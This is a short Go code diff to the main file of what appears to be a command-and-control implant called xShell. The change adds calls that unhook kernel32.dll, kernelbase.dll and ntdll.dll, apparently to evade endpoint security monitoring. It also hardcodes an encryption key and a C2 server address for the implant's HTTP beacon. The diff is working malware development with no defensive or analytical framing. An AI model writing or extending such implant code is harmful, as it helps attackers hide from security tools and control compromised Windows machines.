@@ -6,13 +6,18 @@ import (
 	"os"
 	"time"
 	"xShell/payload/internal"
+
+	"github.com/coremedic/goldr/pkg/evasion"
 )
 
 // TODO: pad keys
-var KeyStr string = "" // must be 16, 24, 32 bytes
-var C2Host string = ""
+var KeyStr string = "thisismypassword" // must be 16, 24, 32 bytes
+var C2Host string = "https://b1.aptlabs.net"
 
 func main() {
+	evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
+	evasion.UnHookDll(`c:\windows\system32\kernelbase.dll`)
+	evasion.UnHookDll(`c:\windows\system32\ntdll.dll`)
 	internal.HttpLink.Host = C2Host
 	internal.HttpLink.Key = []byte(KeyStr)
 	id, err := getId()
